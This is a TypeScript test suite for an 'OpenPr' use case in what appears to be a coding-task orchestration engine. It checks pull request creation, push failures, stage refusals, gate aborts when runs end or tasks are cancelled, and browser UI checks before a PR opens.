    const { app, task, worker } = await setup();
    app.codeHost.createPullRequestResult = { ok: false, reason: 'GitHub is down' };

    const first = await app.openPr.execute(worker, TEXT);

    expect(first).toMatchObject({ ok: false, reason: 'host_error' });
    expect(app.branchPublisher.pushes).toHaveLength(1);
    expect(app.task(task.id).stage).toBe('Verifying');
    app.codeHost.createPullRequestResult = {
      ok: true,
      number: 7,
      url: 'https://github.com/o/r/pull/7',
      created: true,
    };

    const second = await app.openPr.execute(worker, TEXT);

    expect(second).toMatchObject({ ok: true, number: 7 });
    expect(app.checkRunner.calls).toHaveLength(1);
    expect(app.task(task.id).stage).toBe('PR Open');
  });

  it('a cached green still goes through Verifying when the worker moved back to Implementing', async () => {
    const { app, task, worker } = await setup();
    app.codeHost.createPullRequestResult = { ok: false, reason: 'down' };
    await app.openPr.execute(worker, TEXT);
    await app.reportStage.execute(worker, { stage: 'Implementing' });
    app.codeHost.createPullRequestResult = { ok: true, number: 7, url: 'u', created: true };

    expect(await app.openPr.execute(worker, TEXT)).toMatchObject({ ok: true });

    expect(app.checkRunner.calls).toHaveLength(1);
    expect(app.task(task.id).stage).toBe('PR Open');
  });

  it('a spec approved again discards the cached green', async () => {
    const { app, task, worker } = await setup();
    app.codeHost.createPullRequestResult = { ok: false, reason: 'down' };
    await app.openPr.execute(worker, TEXT);
    await freeze(app, task.id, ['pnpm test']);

    await app.openPr.execute(worker, TEXT);

    expect(app.checkRunner.calls).toHaveLength(2);
  });

  it('push_rejected: names the remedy, creates no PR and keeps the green', async () => {
    const { app, worker } = await setup();
    app.branchPublisher.pushResult = { ok: false, reason: 'rejected', detail: 'non-fast-forward' };

    const result = await app.openPr.execute(worker, TEXT);

    expect(result).toMatchObject({ ok: false, reason: 'push_rejected' });
    expect((result as { detail: string }).detail).toContain('non-fast-forward');
    expect((result as { detail: string }).detail).toContain('Do not rewrite history');
    expect(app.codeHost.pullRequests).toEqual([]);
    expect(types(app)).toContain('checks_passed');
    expect(types(app)).not.toContain('branch_pushed');
  });

  it('an unreachable remote is a host_error', async () => {
    const { app, worker } = await setup();
    app.branchPublisher.pushResult = { ok: false, reason: 'unreachable', detail: 'timed out' };

    expect(await app.openPr.execute(worker, TEXT)).toMatchObject({
      ok: false,
      reason: 'host_error',
      detail: 'timed out',
    });
    expect(app.codeHost.pullRequests).toEqual([]);
  });
});

describe('OpenPr — refusals that need no gate', () => {
  it.each<TaskStage>(['Context', 'Spec Review'])('is not allowed from %s', async (stage) => {
    const { app, worker } = await setup(stage);

    expect(await app.openPr.execute(worker, TEXT)).toMatchObject({
      ok: false,
      reason: 'wrong_stage',
    });
    expect(app.checkRunner.calls).toEqual([]);
    expectNothingPublished(app);
  });

  it('is not for a ui_check task', async () => {
    const app = buildTestApp();
    const { task } = await app.seed.task({
      stage: 'Reviewing',
      kind: 'ui_check',
      pr: { number: 3, url: 'https://x/3' },
    });

    expect(await app.openPr.execute(app.identity.worker(task), {})).toMatchObject({
      reason: 'wrong_stage',
    });
  });

  it('needs both a title and a body for the first PR', async () => {
    const { app, worker } = await setup();

    for (const input of [{}, { title: 'T' }, { body: 'B' }]) {
      expect(await app.openPr.execute(worker, input)).toMatchObject({
        reason: 'title_and_body_required',
      });
    }
    expect(app.checkRunner.calls).toEqual([]);
  });

  it('answers host_unconfigured without running the gate when the engine has no token', async () => {
    const { app, worker } = await setup('Implementing', { hostConfigured: false });

    expect(await app.openPr.execute(worker, TEXT)).toMatchObject({
      ok: false,
      reason: 'host_unconfigured',
    });
    expect(app.checkRunner.calls).toEqual([]);
  });

  it('answers repo_unknown when the task has no repository the engine can name', async () => {
    const { app, worker } = await setup();
    app.repos.default = null;

    expect(await app.openPr.execute(worker, TEXT)).toMatchObject({ reason: 'repo_unknown' });
    expect(app.checkRunner.calls).toEqual([]);
  });

  it('pushes to the task’s target repo', async () => {
    const app = buildTestApp();
    const { task } = await app.seed.task({
      stage: 'Implementing',
      targetRepo: { owner: 'o', name: 'other' },
    });

    await app.openPr.execute(app.identity.worker(task), TEXT);

    expect(app.branchPublisher.pushes[0]?.repo).toEqual({ owner: 'o', name: 'other' });
    expect(app.codeHost.pullRequests[0]?.repo).toBe('o/other');
  });

  it('is refused for a dispatcher and for a finished task', async () => {
    const { app, task, thread, worker } = await setup();

    await expect(
      app.openPr.execute(app.identity.dispatcher(thread.id), TEXT),
    ).rejects.toBeInstanceOf(ForbiddenError);
    await app.cancelTask.execute({ taskId: task.id });
    await expect(app.openPr.execute(worker, TEXT)).rejects.toBeInstanceOf(ForbiddenError);
    expect(app.checkRunner.calls).toEqual([]);
  });
});

describe('OpenPr — one gate per task, and the gate stops with its run', () => {
  it('refuses a second call while one is running', async () => {
    const { app, worker } = await setup();
    let release: () => void = () => undefined;
    app.checkRunner.hold = new Promise<void>((resolve) => {
      release = resolve;
    });

    const first = app.openPr.execute(worker, TEXT);
    await tick();
    const second = await app.openPr.execute(worker, TEXT);
    release();

    expect(second).toMatchObject({ ok: false, reason: 'already_running' });
    expect(await first).toMatchObject({ ok: true });
    expect(app.checkRunner.calls).toHaveLength(1);
  });

  /** A task whose worker run is live in the scheduler, ready for `open_pr`. */
  async function liveWorker() {
    const app = buildTestApp({ realRuns: true });
    const { taskId } = await createTaskInNewThread(app);
    const first = app.runner.processes[0];
    if (first === undefined) throw new Error('test: the worker did not start');
    app.artifacts.write(taskId, 'spec.md', '# Spec');
    app.artifacts.write(taskId, 'plan.md', '# Plan');
    const { cardId } = await app.submitSpec.execute(identityOfProcess(app, 0), { summary: 's' });
    await first.succeed(0.1);
    await app.answerDecision.execute(cardId, { decision: 'approve' });
    return { app, taskId, process: app.runner.processes[1], worker: identityOfProcess(app, 1) };
  }

  it('is aborted when the worker run ends: the runner is told to stop and nothing is published', async () => {
    const { app, taskId, process, worker } = await liveWorker();
    app.checkRunner.hold = new Promise<void>(() => undefined);

    const running = app.openPr.execute(worker, TEXT);
    await tick();
    expect(app.checkRunner.calls).toHaveLength(1);
    await process?.succeed(0.1);
    const result = await running;

    expect(result).toMatchObject({ ok: false, reason: 'checks_unavailable' });
    expect(app.checkRunner.aborted).toBe(1);
    expectNothingPublished(app);
    expect(app.task(taskId).counters.checkRetries).toBe(0);
  });

  it('a base run aborted with the worker run keeps the "run ended" refusal: nothing cached, no retry', async () => {
    const { app, taskId, process, worker } = await liveWorker();
    app.checkRunner.script('pnpm test', { exitCode: 1 });
    app.branchPublisher.onBaseHook = () => {
      app.checkRunner.hold = new Promise<void>(() => undefined);
    };

    const running = app.openPr.execute(worker, TEXT);
    for (let i = 0; i < 20 && app.branchPublisher.onBaseCalls.length === 0; i += 1) await tick();
    expect(app.branchPublisher.onBaseCalls).toHaveLength(1);
    await process?.succeed(0.1);
    const result = await running;

    expect(result).toMatchObject({ ok: false, reason: 'checks_unavailable' });
    expect((result as { detail: string }).detail).toContain('run ended');
    expect(app.db.tables.journal.filter((e) => e.type === 'check_base_result')).toEqual([]);
    expect(app.task(taskId).counters.checkRetries).toBe(0);
    expectNothingPublished(app);
  });

  it('is aborted when the task is cancelled (the cancel stops the run)', async () => {
    const { app, taskId, worker } = await liveWorker();
    app.checkRunner.hold = new Promise<void>(() => undefined);

    const running = app.openPr.execute(worker, TEXT);
    await tick();
    await app.cancelTask.execute({ taskId });
    const result = await running;

    expect(result).toMatchObject({ ok: false });
    expect(app.checkRunner.aborted).toBe(1);
    expect(app.task(taskId).stage).toBe('Cancelled');
    expectNothingPublished(app);
  });

  it('appends the gate’s progress lines to the worker’s run as events', async () => {
    const { app, worker } = await liveWorker();
    app.checkRunner.progress = [
      'checks running: pnpm test (30s)',
      'checks running: pnpm test (60s)',
    ];

    await app.openPr.execute(worker, TEXT);

    const events = app.db.tables.runEvents.get(worker.runId) ?? [];
    const progress = events.filter(
      (e) => e.kind === 'system' && e.payload.subtype === 'checks_progress',
    );
    expect(progress.map((e) => (e.kind === 'system' ? e.payload.message : ''))).toEqual([
      'checks running: pnpm test (30s)',
      'checks running: pnpm test (60s)',
    ]);
  });
});

describe('no use case but OpenPr moves a task to PR Open (ADR-0022)', () => {
  it('finds the move in open-pr.ts only', () => {
    const root = fileURLToPath(new URL('..', import.meta.url));
    const found: string[] = [];
    const walk = (dir: string): void => {
      for (const name of readdirSync(dir)) {
        const path = join(dir, name);
        if (statSync(path).isDirectory()) {
          if (name !== 'testing') walk(path);
        } else if (name.endsWith('.ts') && !name.endsWith('.test.ts')) {
          const source = readFileSync(path, 'utf8');
          if (/\.move\([^;]*'PR Open'/s.test(source)) found.push(path.slice(root.length));
        }
      }
    };
    walk(root);
    expect(found).toEqual([join('tasks', 'open-pr.ts')]);
  });
});

describe('OpenPr — a change to the UI is checked in a browser first (ADR-0014)', () => {
  const touchUi = (app: TestApp): void => {
    app.branchPublisher.state = {
      dirtyFiles: [],
      commitsAhead: 1,
      changedFiles: ['src/a.ts', 'web/src/Button.tsx'],
    };
  };
  const note = (app: TestApp, taskId: string, type: string): Promise<void> =>
    app.uow.run((tx) => tx.journal.append(taskEvent(taskId, type, app.clock.now(), 'system', {})));

  it('refuses the first PR while no UI check was attempted, and names the files', async () => {
    const { app, worker } = await setup('Reviewing');
    touchUi(app);

    const result = await app.openPr.execute(worker, TEXT);

    expect(result).toMatchObject({
      ok: false,
      reason: 'ui_check_required',
      files: ['web/src/Button.tsx'],
    });
    expect(app.checkRunner.calls).toHaveLength(0);
    expectNothingPublished(app);
  });

  it.each(['dev_server_started', 'dev_server_refused'])(
    'opens the PR once the journal shows %s',
    async (type) => {
      const { app, task, worker } = await setup('Reviewing');
      touchUi(app);
      await note(app, task.id, type);

      expect(await app.openPr.execute(worker, TEXT)).toMatchObject({ ok: true });
    },
  );

  it('asks for nothing when the diff touches no UI file', async () => {
    const { app, worker } = await setup('Reviewing');

    expect(await app.openPr.execute(worker, TEXT)).toMatchObject({ ok: true });
  });
});
